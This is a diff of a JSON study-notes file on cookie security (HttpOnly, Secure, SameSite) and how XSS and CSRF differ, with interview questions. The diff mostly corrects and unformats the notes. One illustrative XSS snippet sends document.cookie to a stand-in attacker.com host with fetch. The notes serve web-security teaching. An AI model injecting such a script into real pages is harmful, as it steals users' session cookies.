-          "markdown": "| Attribute | Purpose | Protects Against | Required For |\n| --- | --- | --- | --- |\n| `HttpOnly` | Prevent JavaScript access | XSS (cookie theft) | All sensitive cookies |\n| `Secure` | HTTPS-only transmission | MitM attacks | Production, `SameSite=None` |\n| `SameSite=Strict` | Same-site only | CSRF attacks | High-security apps |\n| `SameSite=Lax` | Same-site + top GET | CSRF attacks | Most web apps (recommended) |\n| `SameSite=None` | All requests | None (allows CSRF) | Third-party integrations |\n| `__Secure-` prefix | Enforce Secure | Insecure cookies | Additional validation |\n| `__Host-` prefix | Subdomain isolation | Subdomain attacks | Maximum security |",
-          "notes": "| Attribute | Purpose | Protects Against | Required For |\n| --- | --- | --- | --- |\n| HttpOnly | Prevent JavaScript access | XSS (cookie theft) | All sensitive cookies |\n| Secure | HTTPS-only transmission | MitM attacks | Production, SameSite=None |\n| SameSite=Strict | Same-site only | CSRF attacks | High-security apps |\n| SameSite=Lax | Same-site + top GET | CSRF attacks | Most web apps (recommended) |\n| SameSite=None | All requests | None (allows CSRF) | Third-party integrations |\n| Secure- prefix | Enforce Secure | Insecure cookies | Additional validation |\n| Host- prefix | Subdomain isolation | Subdomain attacks | Maximum security |",
+          "markdown": "| Attribute | Purpose | Protects Against | Required For |\n| --- | --- | --- | --- |\n| `HttpOnly` | Prevent JavaScript access | XSS (cookie theft) | All sensitive cookies |\n| `Secure` | HTTPS-only transmission | MitM attacks | Production, `SameSite=None` |\n| `SameSite=Strict` | Same-site only | Cross-site CSRF | High-security apps |\n| `SameSite=Lax` | Same-site + top-level GET | Cross-site POST CSRF | Most web apps (recommended) |\n| `SameSite=None` | All requests | None (allows CSRF) | Third-party integrations |\n| `__Secure-` prefix | Enforce Secure | Insecure cookies | Additional validation |\n| `__Host-` prefix | Subdomain isolation | Subdomain attacks | Maximum security |\n\nLax still sends the cookie when someone follows a cross-site link. Strict does not, but a sibling subdomain is still same-site. Put a CSRF token on state-changing requests either way.",
+          "notes": "| Attribute | Purpose | Protects Against | Required For |\n| --- | --- | --- | --- |\n| HttpOnly | Prevent JavaScript access | XSS (cookie theft) | All sensitive cookies |\n| Secure | HTTPS-only transmission | MitM attacks | Production, SameSite=None |\n| SameSite=Strict | Same-site only | Cross-site CSRF | High-security apps |\n| SameSite=Lax | Same-site + top-level GET | Cross-site POST CSRF | Most web apps (recommended) |\n| SameSite=None | All requests | None (allows CSRF) | Third-party integrations |\n| Secure- prefix | Enforce Secure | Insecure cookies | Additional validation |\n| Host- prefix | Subdomain isolation | Subdomain attacks | Maximum security |\n\nLax still sends the cookie when someone follows a cross-site link. Strict does not, but a sibling subdomain is still same-site. Put a CSRF token on state-changing requests either way.",
           "kind": "topic",
           "level": 2,
           "children": [],
@@ -3201,7 +3201,7 @@
         {
           "id": "nda4d7331f037f5b",
           "title": "Attack Protection Matrix",
-          "markdown": "| Attack Type | HttpOnly | Secure | SameSite | CSRF Token |\n| --- | --- | --- | --- | --- |\n| **XSS (cookie theft)** | \u2705 Yes | \u274c No | \u274c No | \u274c No |\n| **CSRF** | \u274c No | \u274c No | \u2705 Yes | \u2705 Yes |\n| **MitM (HTTP)** | \u274c No | \u2705 Yes | \u274c No | \u274c No |\n| **Subdomain attack** | \u274c No | \u274c No | \u274c No | \u2705 Yes* |\n- With `__Host-` prefix",
+          "markdown": "| Attack Type | HttpOnly | Secure | SameSite | CSRF Token |\n| --- | --- | --- | --- | --- |\n| XSS (cookie theft) | \u2705 Yes | \u274c No | \u274c No | \u274c No |\n| CSRF | \u274c No | \u274c No | \u2705 Yes | \u2705 Yes |\n| MitM (HTTP) | \u274c No | \u2705 Yes | \u274c No | \u274c No |\n| Subdomain attack | \u274c No | \u274c No | \u274c No | \u2705 Yes* |\n- With `__Host-` prefix",
           "notes": "| Attack Type | HttpOnly | Secure | SameSite | CSRF Token |\n| --- | --- | --- | --- | --- |\n| XSS (cookie theft) | \u2705 Yes | \u274c No | \u274c No | \u274c No |\n| CSRF | \u274c No | \u274c No | \u2705 Yes | \u2705 Yes |\n| MitM (HTTP) | \u274c No | \u2705 Yes | \u274c No | \u274c No |\n| Subdomain attack | \u274c No | \u274c No | \u274c No | \u2705 Yes |\n- With Host- prefix",
           "kind": "topic",
           "level": 2,
@@ -3335,123 +3335,123 @@
         {
           "id": "n0f69f5a12f05e27",
           "title": "Testing Checklist",
-          "markdown": "[ ] Cookies have HttpOnly attribute - [ ] Cookies have Secure attribute (production) - [ ] Cookies have SameSite attribute (Strict or Lax) - [ ] [ ] SameSite=None cookies have Secure - [ ] [ ] Host- cookies don't have...",
-          "notes": "[ ] Cookies have HttpOnly attribute - [ ] Cookies have Secure attribute (production) - [ ] Cookies have SameSite attribute (Strict or Lax) - [ ] [ ] SameSite=None cookies have Secure - [ ] [ ] Host- cookies don't have...",
+          "markdown": "Cookies have the HttpOnly attribute - Cookies have the Secure attribute in production - Cookies have SameSite set to Strict or Lax - SameSite=None cookies also have Secure - Host- cookies do not set Domain - Host-...",
+          "notes": "Cookies have the HttpOnly attribute - Cookies have the Secure attribute in production - Cookies have SameSite set to Strict or Lax - SameSite=None cookies also have Secure - Host- cookies do not set Domain - Host-...",
           "kind": "topic",
           "level": 2,
           "children": [
             {
-              "id": "nf9dd5a1fedaf99e",
-              "title": "[ ] Cookies have HttpOnly attribute",
-              "markdown": "- [ ] Cookies have HttpOnly attribute",
-              "notes": "[ ] Cookies have HttpOnly attribute",
-              "blurb": "[ ] Cookies have HttpOnly attribute",
+              "id": "n53d50123135ca6b",
+              "title": "Cookies have the HttpOnly attribute",
+              "markdown": "- Cookies have the HttpOnly attribute",
+              "notes": "Cookies have the HttpOnly attribute",
+              "blurb": "Cookies have the HttpOnly attribute",
               "kind": "topic",
               "level": 3,
               "children": [],
               "expanded": false
             },
             {
-              "id": "nefb863a750fac0b",
-              "title": "[ ] Cookies have Secure attribute (production)",
-              "markdown": "- [ ] Cookies have Secure attribute (production)",
-              "notes": "[ ] Cookies have Secure attribute (production)",
-              "blurb": "[ ] Cookies have Secure attribute (production)",
+              "id": "n98b6c9b1ae9432c",
+              "title": "Cookies have the Secure attribute in production",
+              "markdown": "- Cookies have the Secure attribute in production",
+              "notes": "Cookies have the Secure attribute in production",
+              "blurb": "Cookies have the Secure attribute in production",
               "kind": "topic",
               "level": 3,
               "children": [],
               "expanded": false
             },
             {
-              "id": "n71a9e02425dae68",
-              "title": "[ ] Cookies have SameSite attribute (Strict or Lax)",
-              "markdown": "- [ ] Cookies have SameSite attribute (Strict or Lax)",
-              "notes": "[ ] Cookies have SameSite attribute (Strict or Lax)",
-              "blurb": "[ ] Cookies have SameSite attribute (Strict or Lax)",
+              "id": "n35b202d4443aa01",
+              "title": "Cookies have SameSite set to Strict or Lax",
+              "markdown": "- Cookies have SameSite set to Strict or Lax",
+              "notes": "Cookies have SameSite set to Strict or Lax",
+              "blurb": "Cookies have SameSite set to Strict or Lax",
               "kind": "topic",
               "level": 3,
               "children": [],
               "expanded": false
             },
             {
-              "id": "n864129558e8660d",
-              "title": "[ ] [ ] SameSite=None cookies have Secure",
-              "markdown": "- [ ] [ ] SameSite=None cookies have Secure",
-              "notes": "[ ] [ ] SameSite=None cookies have Secure",
-              "blurb": "[ ] [ ] SameSite=None cookies have Secure",
+              "id": "n310b4e5f043f5c8",
+              "title": "SameSite=None cookies also have Secure",
+              "markdown": "- SameSite=None cookies also have Secure",
+              "notes": "SameSite=None cookies also have Secure",
+              "blurb": "SameSite=None cookies also have Secure",
               "kind": "topic",
               "level": 3,
               "children": [],
               "expanded": false
             },
             {
-              "id": "n5976ef08ed48fea",
-              "title": "[ ] [ ] __Host- cookies don't have Domain",
-              "markdown": "- [ ] [ ] __Host- cookies don't have Domain",
-              "notes": "[ ] [ ] __Host- cookies don't have Domain",
-              "blurb": "[ ] [ ] Host- cookies don't have Domain",
+              "id": "n86bbd45bb8f9f2d",
+              "title": "__Host- cookies do not set Domain",
+              "markdown": "- __Host- cookies do not set Domain",
+              "notes": "__Host- cookies do not set Domain",
+              "blurb": "Host- cookies do not set Domain",
               "kind": "topic",
               "level": 3,
               "children": [],
               "expanded": false
             },
             {
-              "id": "nb7a1a22cbe33ff7",
-              "title": "[ ] [ ] __Host- cookies have Path=/",
-              "markdown": "- [ ] [ ] __Host- cookies have Path=/",
-              "notes": "[ ] [ ] __Host- cookies have Path=/",
-              "blurb": "[ ] [ ] Host- cookies have Path=/",
+              "id": "n33c906d8ed09c73",
+              "title": "__Host- cookies use Path=/",
+              "markdown": "- __Host- cookies use Path=/",
+              "notes": "__Host- cookies use Path=/",
+              "blurb": "Host- cookies use Path=/",
               "kind": "topic",
               "level": 3,
               "children": [],
               "expanded": false
             },
             {
-              "id": "ncbed3b736518cc9",
-              "title": "[ ] Expiration times are reasonable",
-              "markdown": "- [ ] Expiration times are reasonable",
-              "notes": "[ ] Expiration times are reasonable",
-              "blurb": "[ ] Expiration times are reasonable",
+              "id": "n90629e95ff7d00d",
+              "title": "Expiration times are reasonable",
+              "markdown": "- Expiration times are reasonable",
+              "notes": "Expiration times are reasonable",
+              "blurb": "Expiration times are reasonable",
               "kind": "topic",
               "level": 3,
               "children": [],
               "expanded": false
             },
             {
-              "id": "nfdd766d3d2562e0",
-              "title": "[ ] Cookies not accessible via document.cookie",
-              "markdown": "- [ ] Cookies not accessible via document.cookie",
-              "notes": "[ ] Cookies not accessible via document.cookie",
-              "blurb": "[ ] Cookies not accessible via document.cookie",
+              "id": "nb8654b5472aee0a",
+              "title": "The session cookie is not readable via document.cookie",
+              "markdown": "- The session cookie is not readable via document.cookie",
+              "notes": "The session cookie is not readable via document.cookie",
+              "blurb": "The session cookie is not readable via document.cookie",
               "kind": "topic",
               "level": 3,
               "children": [],
               "expanded": false
             },
             {
-              "id": "na52381e123f2d75",
-              "title": "[ ] Cookies only sent over HTTPS",
-              "markdown": "- [ ] Cookies only sent over HTTPS",
-              "notes": "[ ] Cookies only sent over HTTPS",
-              "blurb": "[ ] Cookies only sent over HTTPS",
+              "id": "n81b7c1c707c7c3b",
+              "title": "The session cookie is only sent over HTTPS",
+              "markdown": "- The session cookie is only sent over HTTPS",
+              "notes": "The session cookie is only sent over HTTPS",
+              "blurb": "The session cookie is only sent over HTTPS",
               "kind": "topic",
               "level": 3,
               "children": [],
               "expanded": false
             },
             {
-              "id": "n4407df9d2cd6fe2",
-              "title": "[ ] CSRF protection working (test with external form)",
-              "markdown": "- [ ] CSRF protection working (test with external form)",
-              "notes": "[ ] CSRF protection working (test with external form)",
-              "blurb": "[ ] CSRF protection working (test with external form)",
+              "id": "nf62e5810f002865",
+              "title": "A cross-site form without a CSRF token is rejected",
+              "markdown": "- A cross-site form without a CSRF token is rejected",
+              "notes": "A cross-site form without a CSRF token is rejected",
+              "blurb": "A cross-site form without a CSRF token is rejected",
               "kind": "topic",
               "level": 3,
               "children": [],
               "expanded": false
             }
           ],
-          "blurb": "[ ] Cookies have HttpOnly attribute - [ ] Cookies have Secure attribute...",
+          "blurb": "Cookies have the HttpOnly attribute - Cookies have the Secure attribute in...",
           "expanded": false
         },
         {
@@ -3479,17 +3479,17 @@
         {
           "id": "n5bc48b2655e70ee",
           "title": "Common Interview Questions",
-          "markdown": "1. **Does HttpOnly protect against CSRF?**",
+          "markdown": "1. Does HttpOnly protect against CSRF?",
           "notes": "1. Does HttpOnly protect against CSRF?",
           "kind": "topic",
           "level": 2,
           "children": [
             {
-              "id": "n53acdd9abebf249",
-              "title": "No, HttpOnly protects against XSS. Use SameSite for CSRF.",
-              "markdown": "- No, HttpOnly protects against XSS. Use SameSite for CSRF.",
-              "notes": "No, HttpOnly protects against XSS. Use SameSite for CSRF.",
-              "blurb": "No, HttpOnly protects against XSS.",
+              "id": "n525c5ad2601ae1e",
+              "title": "No. The browser still sends the cookie. Use SameSite or a CSRF token.",
+              "markdown": "- No. The browser still sends the cookie. Use SameSite or a CSRF token.",
+              "notes": "No. The browser still sends the cookie. Use SameSite or a CSRF token.",
+              "blurb": "",
               "kind": "topic",
               "level": 3,
               "children": [],
@@ -3540,7 +3540,7 @@
               "expanded": false
             }
           ],
-          "blurb": "Includes No, HttpOnly protects against XSS. Use SameSite for CSRF.",
+          "blurb": "Includes No. The browser still sends the cookie. Use SameSite or a CSRF token.",
           "expanded": false
         },
         {
@@ -3735,7 +3735,7 @@
         {
           "id": "n87c686d157a2889",
           "title": "Common Misconception",
-          "markdown": "**Question:** \"If HttpOnly can only be used for CSRF tokens, then it is not protecting against CSRF attacks?\"\n\n**Answer:** This question reveals a common misunderstanding. Let me clarify:",
+          "markdown": "Question: \"If HttpOnly can only be used for CSRF tokens, then it is not protecting against CSRF attacks?\"\n\nAnswer: This question reveals a common misunderstanding. Let me clarify:",
           "notes": "Question: \"If HttpOnly can only be used for CSRF tokens, then it is not protecting against CSRF attacks?\"\n\nAnswer: This question reveals a common misunderstanding. Let me clarify:",
           "kind": "topic",
           "level": 2,
@@ -3754,12 +3754,12 @@
             {
               "id": "n1cca32383877f8b",
               "title": "HttpOnly Does NOT Protect Against CSRF Attacks",
-              "markdown": "**HttpOnly protects against XSS (Cross-Site Scripting), NOT CSRF (Cross-Site Request Forgery).**\n\nThese are two completely different attack vectors:",
-              "notes": "HttpOnly protects against XSS (Cross-Site Scripting), NOT CSRF (Cross-Site Request Forgery).\n\nThese are two completely different attack vectors:",
+              "markdown": "HttpOnly stops JavaScript from reading the cookie. That limits cookie theft during XSS. It does not stop XSS from acting as the user, and it does not stop CSRF.\n\nThese are two completely different attack vectors:",
+              "notes": "HttpOnly stops JavaScript from reading the cookie. That limits cookie theft during XSS. It does not stop XSS from acting as the user, and it does not stop CSRF.\n\nThese are two completely different attack vectors:",
               "kind": "topic",
               "level": 3,
               "children": [],
-              "blurb": "HttpOnly protects against XSS (Cross-Site Scripting), NOT CSRF (Cross-Site...",
+              "blurb": "HttpOnly stops JavaScript from reading the cookie.",
               "expanded": false
             }
           ],
@@ -3775,9 +3775,9 @@
           "level": 2,
           "children": [
             {
-              "id": "n491b42c8fa9dfae",
-              "title": "XSS Attack (What HttpOnly Protects Against)",
-              "markdown": "**How XSS Works:**\n\n```\n1. Attacker injects malicious JavaScript into a website\n2. Victim visits the website\n3. Malicious script runs in victim's browser\n4. Script accesses cookies via document.cookie\n5. Script sends cookies to attacker's server\n6. Attacker uses stolen cookies to impersonate victim\n\n```\n\n**Example:**\n\n```jsx\n// Vulnerable website has XSS vulnerability// Attacker injects this script:\n<script>\n// This JavaScript can access cookiesvar stolenCookie = document.cookie;\n  fetch('https://attacker.com/steal?cookie=' + stolenCookie);\n</script>\n\n// If cookie has HttpOnly:Set-Cookie: sessionId=abc123; HttpOnly\n\n// JavaScript CANNOT access it:console.log(document.cookie);// Does NOT include sessionId// XSS attack fails - cookie cannot be stolen\n```\n\n**HttpOnly Protection:**",
+              "id": "nf006b54fea21320",
+              "title": "XSS cookie theft (what HttpOnly limits)",
+              "markdown": "How XSS Works:\n\n```\n1. Attacker injects malicious JavaScript into a website\n2. Victim visits the website\n3. Malicious script runs in victim's browser\n4. Script accesses cookies via document.cookie\n5. Script sends cookies to attacker's server\n6. Attacker uses stolen cookies to impersonate victim\n\n```\n\nExample:\n\n```jsx\n// Vulnerable website has XSS vulnerability// Attacker injects this script:\n<script>\n// This JavaScript can access cookiesvar stolenCookie = document.cookie;\n  fetch('https://attacker.com/steal?cookie=' + stolenCookie);\n</script>\n\n// If cookie has HttpOnly:Set-Cookie: sessionId=abc123; HttpOnly\n\n// JavaScript CANNOT access it:console.log(document.cookie);// Does NOT include sessionId// XSS attack fails - cookie cannot be stolen\n```\n\nHttpOnly Protection:",
               "notes": "How XSS Works:\n\n1. Attacker injects malicious JavaScript into a website\n2. Victim visits the website\n3. Malicious script runs in victim's browser\n4. Script accesses cookies via document.cookie\n5. Script sends cookies to attacker's server\n6. Attacker uses stolen cookies to impersonate victim\n\nExample:\n\n// Vulnerable website has XSS vulnerability// Attacker injects this script:\n<script>\n// This JavaScript can access cookiesvar stolenCookie = document.cookie;\n  fetch('https://attacker.com/steal?cookie=' + stolenCookie);\n</script>\n\n// If cookie has HttpOnly:Set-Cookie: sessionId=abc123; HttpOnly\n\n// JavaScript CANNOT access it:console.log(document.cookie);// Does NOT include sessionId// XSS attack fails - cookie cannot be stolen\n\nHttpOnly Protection:",
               "kind": "topic",
               "level": 3,
@@ -3822,7 +3822,7 @@
             {
               "id": "n5ed9f55134c50ac",
               "title": "CSRF Attack (What HttpOnly Does NOT Protect Against)",
-              "markdown": "**How CSRF Works:**\n\n```\n```",
+              "markdown": "How CSRF Works:\n\n```\n```",
               "notes": "How CSRF Works:",
               "kind": "topic",
               "level": 3,
@@ -3909,7 +3909,7 @@
               "expanded": false
             }
           ],
-          "blurb": "Includes XSS Attack (What HttpOnly Protects Against)",
+          "blurb": "Includes XSS cookie theft (what HttpOnly limits)",
           "expanded": false
         },
         {
@@ -3923,7 +3923,7 @@
             {
               "id": "n2f0dca4dd54c16f",
               "title": "SameSite Attribute (Cookie-Level Protection)",
-              "markdown": "**SameSite=Strict:**\n\n```jsx\nSet-Cookie: sessionId=abc123; HttpOnly; Secure; SameSite=Strict\n\n// CSRF attack from evil.com:POST https://bank.com/transfer HTTP/1.1Cookie: (NOT SENT)\n\n// Attack fails - cookie not sent with cross-site request\n```\n\n**SameSite=Lax:**\n\n```jsx\nSet-Cookie: sessionId=abc123; HttpOnly; Secure; SameSite=Lax\n\n// CSRF POST request from evil.com:POST https://bank.com/transfer HTTP/1.1Cookie: (NOT SENT)\n\n// Attack fails - cookie not sent with cross-site POST\n```",
+              "markdown": "SameSite=Strict:\n\n```jsx\nSet-Cookie: sessionId=abc123; HttpOnly; Secure; SameSite=Strict\n\n// CSRF attack from evil.com:POST https://bank.com/transfer HTTP/1.1Cookie: (NOT SENT)\n\n// Attack fails - cookie not sent with cross-site request\n```\n\nSameSite=Lax:\n\n```jsx\nSet-Cookie: sessionId=abc123; HttpOnly; Secure; SameSite=Lax\n\n// CSRF POST request from evil.com:POST https://bank.com/transfer HTTP/1.1Cookie: (NOT SENT)\n\n// Attack fails - cookie not sent with cross-site POST\n```",
               "notes": "SameSite=Strict:\n\nSet-Cookie: sessionId=abc123; HttpOnly; Secure; SameSite=Strict\n\n// CSRF attack from evil.com:POST https://bank.com/transfer HTTP/1.1Cookie: (NOT SENT)\n\n// Attack fails - cookie not sent with cross-site request\n\nSameSite=Lax:\n\nSet-Cookie: sessionId=abc123; HttpOnly; Secure; SameSite=Lax\n\n// CSRF POST request from evil.com:POST https://bank.com/transfer HTTP/1.1Cookie: (NOT SENT)\n\n// Attack fails - cookie not sent with cross-site POST",
               "kind": "topic",
               "level": 3,
@@ -3934,7 +3934,7 @@
             {
               "id": "nf1c2523b92a6d81",
               "title": "CSRF Tokens (Application-Level Protection)",
-              "markdown": "**How CSRF Tokens Work:**\n\n```html\n\n<form action=\"/transfer\" method=\"POST\">\n  <input type=\"hidden\" name=\"csrf_token\" value=\"random-token-12345\">\n  <input type=\"text\" name=\"to\" value=\"\">\n  <input type=\"text\" name=\"amount\" value=\"\">\n</form>\n\n```\n\n**Why CSRF Tokens Should Be HttpOnly:**\n\n```jsx\n// CSRF token stored in cookie (should be HttpOnly)Set-Cookie: csrf_token=random-token-12345; HttpOnly\n\n// Why HttpOnly? To prevent XSS from stealing the token:// If attacker injects XSS:\n<script>\n// Cannot access csrf_token cookie (HttpOnly)// Cannot steal token to forge CSRF request\n</script>\n\n// But HttpOnly doesn't prevent CSRF itself// The token validation does!\n```",
+              "markdown": "How CSRF Tokens Work:\n\n```html\n\n<form action=\"/transfer\" method=\"POST\">\n  <input type=\"hidden\" name=\"csrf_token\" value=\"random-token-12345\">\n  <input type=\"text\" name=\"to\" value=\"\">\n  <input type=\"text\" name=\"amount\" value=\"\">\n</form>\n\n```\n\nWhy CSRF Tokens Should Be HttpOnly:\n\n```jsx\n// CSRF token stored in cookie (should be HttpOnly)Set-Cookie: csrf_token=random-token-12345; HttpOnly\n\n// Why HttpOnly? To prevent XSS from stealing the token:// If attacker injects XSS:\n<script>\n// Cannot access csrf_token cookie (HttpOnly)// Cannot steal token to forge CSRF request\n</script>\n\n// But HttpOnly doesn't prevent CSRF itself// The token validation does!\n```",
               "notes": "How CSRF Tokens Work:\n\n<form action=\"/transfer\" method=\"POST\">\n  <input type=\"hidden\" name=\"csrftoken\" value=\"random-token-12345\">\n  <input type=\"text\" name=\"to\" value=\"\">\n  <input type=\"text\" name=\"amount\" value=\"\">\n</form>\n\nWhy CSRF Tokens Should Be HttpOnly:\n\n// CSRF token stored in cookie (should be HttpOnly)Set-Cookie: csrftoken=random-token-12345; HttpOnly\n\n// Why HttpOnly? To prevent XSS from stealing the token:// If attacker injects XSS:\n<script>\n// Cannot access csrftoken cookie (HttpOnly)// Cannot steal token to forge CSRF request\n</script>\n\n// But HttpOnly doesn't prevent CSRF itself// The token validation does!",
               "kind": "topic",
               "level": 3,
@@ -3957,7 +3957,7 @@
             {
               "id": "n27863163127593b",
               "title": "HttpOnly + CSRF Token = Defense in Depth",
-              "markdown": "```jsx\n// Session cookie (identifies user)Set-Cookie: sessionId=abc123; HttpOnly; Secure; SameSite=Lax\n\n// CSRF token cookie (validates request)Set-Cookie: csrf_token=xyz789; HttpOnly; Secure; SameSite=Strict\n\n```\n\n**How They Work Together:**\n\n1. **HttpOnly on Session Cookie:**",
+              "markdown": "```jsx\n// Session cookie (identifies user)Set-Cookie: sessionId=abc123; HttpOnly; Secure; SameSite=Lax\n\n// CSRF token cookie (validates request)Set-Cookie: csrf_token=xyz789; HttpOnly; Secure; SameSite=Strict\n\n```\n\nHow They Work Together:\n\n1. HttpOnly on Session Cookie:",
               "notes": "// Session cookie (identifies user)Set-Cookie: sessionId=abc123; HttpOnly; Secure; SameSite=Lax\n\n// CSRF token cookie (validates request)Set-Cookie: csrftoken=xyz789; HttpOnly; Secure; SameSite=Strict\n\nHow They Work Together:\n\n1. HttpOnly on Session Cookie:",
               "kind": "topic",
               "level": 3,
@@ -4126,7 +4126,7 @@
             {
               "id": "nd41ca2f4623b219",
               "title": "SameSite",
-              "markdown": "- \u2705 **Protects against:** CSRF attacks\n- **Purpose:** Control when cookies are sent with requests",
+              "markdown": "- \u2705 Protects against: CSRF attacks\n- Purpose: Control when cookies are sent with requests",
               "notes": "- \u2705 Protects against: CSRF attacks\n- Purpose: Control when cookies are sent with requests",
               "kind": "topic",
               "level": 3,
@@ -4197,7 +4197,7 @@
         {
           "id": "ne355a8b971de55e",
           "title": "Common Interview Question",
-          "markdown": "**Q: \"Does HttpOnly protect against CSRF attacks?\"**\n\n**A: \"No, HttpOnly does not protect against CSRF attacks. HttpOnly prevents JavaScript from accessing cookies, which protects against XSS cookie theft. However, CSRF attacks work by tricking the browser into automatically sending cookies with cross-site requests, and HttpOnly does not prevent the browser from doing this. To protect against CSRF, you should use the SameSite attribute on cookies or implement CSRF tokens. CSRF tokens themselves should be HttpOnly to prevent XSS from stealing them, but the HttpOnly attribute on the token doesn't prevent CSRF - the token validation does.\"**",
+          "markdown": "Q: \"Does HttpOnly protect against CSRF attacks?\"\n\nA: \"No, HttpOnly does not protect against CSRF attacks. HttpOnly prevents JavaScript from accessing cookies, which protects against XSS cookie theft. However, CSRF attacks work by tricking the browser into automatically sending cookies with cross-site requests, and HttpOnly does not prevent the browser from doing this. To protect against CSRF, you should use the SameSite attribute on cookies or implement CSRF tokens. CSRF tokens themselves should be HttpOnly to prevent XSS from stealing them, but the HttpOnly attribute on the token doesn't prevent CSRF - the token validation does.\"",
           "notes": "Q: \"Does HttpOnly protect against CSRF attacks?\"\n\nA: \"No, HttpOnly does not protect against CSRF attacks. HttpOnly prevents JavaScript from accessing cookies, which protects against XSS cookie theft. However, CSRF attacks work by tricking the browser into automatically sending cookies with cross-site requests, and HttpOnly does not prevent the browser from doing this. To protect against CSRF, you should use the SameSite attribute on cookies or implement CSRF tokens. CSRF tokens themselves should be HttpOnly to prevent XSS from stealing them, but the HttpOnly attribute on the token doesn't prevent CSRF - the token validation does.\"",
           "kind": "topic",
           "level": 2,
@@ -4208,7 +4208,7 @@
         {
           "id": "n9800209d98129cd",
           "title": "Summary Table",
-          "markdown": "| Protection Mechanism | Protects Against XSS | Protects Against CSRF | How It Works |\n| --- | --- | --- | --- |\n| **HttpOnly** | \u2705 Yes | \u274c No | Prevents JavaScript access to cookies |\n| **SameSite=Strict** | \u274c No | \u2705 Yes | Prevents cookie from being sent with cross-site requests |\n| **SameSite=Lax** | \u274c No | \u2705 Partial | Prevents cookie from being sent with cross-site POST requests |\n| **CSRF Tokens** | \u274c No | \u2705 Yes | Server validates token to ensure request is legitimate |\n| **Secure** | \u274c No | \u274c No | Ensures cookie only sent over HTTPS |",
+          "markdown": "| Protection Mechanism | Protects Against XSS | Protects Against CSRF | How It Works |\n| --- | --- | --- | --- |\n| HttpOnly | \u2705 Yes | \u274c No | Prevents JavaScript access to cookies |\n| SameSite=Strict | \u274c No | \u2705 Yes | Prevents cookie from being sent with cross-site requests |\n| SameSite=Lax | \u274c No | \u2705 Partial | Prevents cookie from being sent with cross-site POST requests |\n| CSRF Tokens | \u274c No | \u2705 Yes | Server validates token to ensure request is legitimate |\n| Secure | \u274c No | \u274c No | Ensures cookie only sent over HTTPS |",
           "notes": "| Protection Mechanism | Protects Against XSS | Protects Against CSRF | How It Works |\n| --- | --- | --- | --- |\n| HttpOnly | \u2705 Yes | \u274c No | Prevents JavaScript access to cookies |\n| SameSite=Strict | \u274c No | \u2705 Yes | Prevents cookie from being sent with cross-site requests |\n| SameSite=Lax | \u274c No | \u2705 Partial | Prevents cookie from being sent with cross-site POST requests |\n| CSRF Tokens | \u274c No | \u2705 Yes | Server validates token to ensure request is legitimate |\n| Secure | \u274c No | \u274c No | Ensures cookie only sent over HTTPS |",
           "kind": "topic",
           "level": 2,
@@ -4238,8 +4238,8 @@
             {
               "id": "n4ef983b29495d2c",
               "title": "Protected Configuration (CSRF Attack Fails)",
-              "markdown": "```jsx\n// Option 1: SameSite protectionSet-Cookie: sessionId=abc123; HttpOnly; Secure; SameSite=Strict\n\n// CSRF attack fails - cookie not sent with cross-site request// Option 2: CSRF tokenSet-Cookie: sessionId=abc123; HttpOnly; Secure\nSet-Cookie: csrf_token=xyz789; HttpOnly; Secure\n\n// Server validates csrf_token// If token missing or invalid, request rejected// CSRF attack fails - no valid token\n```\n\n---\n\nRemember: **HttpOnly protects against XSS, not CSRF. Use SameSite or CSRF tokens to protect against CSRF.**",
-              "notes": "// Option 1: SameSite protectionSet-Cookie: sessionId=abc123; HttpOnly; Secure; SameSite=Strict\n\n// CSRF attack fails - cookie not sent with cross-site request// Option 2: CSRF tokenSet-Cookie: sessionId=abc123; HttpOnly; Secure\nSet-Cookie: csrftoken=xyz789; HttpOnly; Secure\n\n// Server validates csrftoken// If token missing or invalid, request rejected// CSRF attack fails - no valid token\n\n---\n\nRemember: HttpOnly protects against XSS, not CSRF. Use SameSite or CSRF tokens to protect against CSRF.",
+              "markdown": "```jsx\n// Option 1: SameSite protectionSet-Cookie: sessionId=abc123; HttpOnly; Secure; SameSite=Strict\n\n// CSRF attack fails - cookie not sent with cross-site request// Option 2: CSRF tokenSet-Cookie: sessionId=abc123; HttpOnly; Secure\nSet-Cookie: csrf_token=xyz789; HttpOnly; Secure\n\n// Server validates csrf_token// If token missing or invalid, request rejected// CSRF attack fails - no valid token\n```\n\n---\n\nRemember: HttpOnly stops script from reading the cookie. It does not stop XSS from acting as the user, and it does not stop CSRF. Use SameSite or a CSRF token for CSRF.",
+              "notes": "// Option 1: SameSite protectionSet-Cookie: sessionId=abc123; HttpOnly; Secure; SameSite=Strict\n\n// CSRF attack fails - cookie not sent with cross-site request// Option 2: CSRF tokenSet-Cookie: sessionId=abc123; HttpOnly; Secure\nSet-Cookie: csrftoken=xyz789; HttpOnly; Secure\n\n// Server validates csrftoken// If token missing or invalid, request rejected// CSRF attack fails - no valid token\n\n---\n\nRemember: HttpOnly stops script from reading the cookie. It does not stop XSS from acting as the user, and it does not stop CSRF. Use SameSite or a CSRF token for CSRF.",
               "kind": "topic",
               "level": 3,
               "children": [],
@@ -5426,7 +5426,7 @@
             {
               "id": "nf196c40c0b7ddc1",
               "title": "What is the HttpOnly attribute and what does it protect against?",
-              "markdown": "**Answer:** The `HttpOnly` attribute is a cookie security flag that prevents client-side JavaScript from accessing the cookie through `document.cookie` or other DOM APIs.\n\n**What it protects against:**",
+              "markdown": "Answer: The `HttpOnly` attribute is a cookie security flag that prevents client-side JavaScript from accessing the cookie through `document.cookie` or other DOM APIs.\n\nWhat it protects against:",
               "notes": "Answer: The HttpOnly attribute is a cookie security flag that prevents client-side JavaScript from accessing the cookie through document.cookie or other DOM APIs.\n\nWhat it protects against:",
               "kind": "topic",
               "level": 3,
@@ -5493,7 +5493,7 @@
             {
               "id": "nf490340ce9bda45",
               "title": "What is the Secure attribute and why is it important?",
-              "markdown": "**Answer:** The `Secure` attribute ensures cookies are only transmitted over HTTPS connections. Browsers will refuse to send `Secure` cookies over unencrypted HTTP connections.\n\n**Why it's important:**",
+              "markdown": "Answer: The `Secure` attribute ensures cookies are only transmitted over HTTPS connections. Browsers will refuse to send `Secure` cookies over unencrypted HTTP connections.\n\nWhy it's important:",
               "notes": "Answer: The Secure attribute ensures cookies are only transmitted over HTTPS connections. Browsers will refuse to send Secure cookies over unencrypted HTTP connections.\n\nWhy it's important:",
               "kind": "topic",
               "level": 3,
@@ -5582,7 +5582,7 @@
             {
               "id": "n4d4d5cb9a70693c",
               "title": "Does HttpOnly protect against CSRF attacks?",
